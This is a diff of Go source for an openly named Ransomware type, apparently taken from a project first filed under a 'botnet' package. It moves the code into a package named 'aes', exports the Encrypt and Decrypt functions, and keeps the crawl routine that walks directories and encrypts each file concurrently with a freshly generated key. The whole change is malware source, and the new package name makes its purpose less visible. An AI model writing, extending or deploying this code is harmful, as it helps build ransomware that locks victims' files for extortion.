@@ -1,4 +1,4 @@
-package botnet
+package aes
 
 import (
 	"bytes"
@@ -30,8 +30,8 @@ type Payload struct {
 	path string
 }
 
-//NewRansomware is
-func NewRansomware(dir string) (*Ransomware, error) {
+//New is
+func New(dir string) (*Ransomware, error) {
 	key := make([]byte, 32)
 	_, err := rand.Read(key)
 	if err != nil {
@@ -59,7 +59,8 @@ func (r *Ransomware) Exec() error {
 
 var ind int
 
-func (r *Ransomware) encrypt(f os.FileInfo, path string) {
+//Encrypt is
+func (r *Ransomware) Encrypt(f os.FileInfo, path string) {
 	defer r.wg.Done()
 	filePath := filepath.Join(path, f.Name())
 	content := new(bytes.Buffer)
@@ -96,6 +97,36 @@ func (r *Ransomware) encrypt(f os.FileInfo, path string) {
 	}
 }
 
+//Decrypt is
+func (Ransomware) Decrypt(key []byte, text string) (string, error) {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return "", err
+	}
+
+	decodedMsg, err := base64.URLEncoding.DecodeString(addBase64Padding(text))
+	if err != nil {
+		return "", err
+	}
+
+	if (len(decodedMsg) % aes.BlockSize) != 0 {
+		return "", errors.New("blocksize must be multipe of decoded message length")
+	}
+
+	iv := decodedMsg[:aes.BlockSize]
+	msg := decodedMsg[aes.BlockSize:]
+
+	cfb := cipher.NewCFBDecrypter(block, iv)
+	cfb.XORKeyStream(msg, msg)
+
+	unpadMsg, err := Unpad(msg)
+	if err != nil {
+		return "", err
+	}
+
+	return string(unpadMsg), nil
+}
+
 func (r *Ransomware) crawl(dir []os.FileInfo, path string) {
 	for _, f := range dir {
 		fp := filepath.Join(path, f.Name())
@@ -109,7 +140,7 @@ func (r *Ransomware) crawl(dir []os.FileInfo, path string) {
 			continue
 		}
 		r.wg.Add(1)
-		go r.encrypt(f, path)
+		go r.Encrypt(f, path)
 	}
 }
 
@@ -143,33 +174,4 @@ func Unpad(src []byte) ([]byte, error) {
 	}
 
 	return src[:(length - unpadding)], nil
-}
-
-func decrypt(key []byte, text string) (string, error) {
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		return "", err
-	}
-
-	decodedMsg, err := base64.URLEncoding.DecodeString(addBase64Padding(text))
-	if err != nil {
-		return "", err
-	}
-
-	if (len(decodedMsg) % aes.BlockSize) != 0 {
-		return "", errors.New("blocksize must be multipe of decoded message length")
-	}
-
-	iv := decodedMsg[:aes.BlockSize]
-	msg := decodedMsg[aes.BlockSize:]
-
-	cfb := cipher.NewCFBDecrypter(block, iv)
-	cfb.XORKeyStream(msg, msg)
-
-	unpadMsg, err := Unpad(msg)
-	if err != nil {
-		return "", err
-	}
-
-	return string(unpadMsg), nil
 }
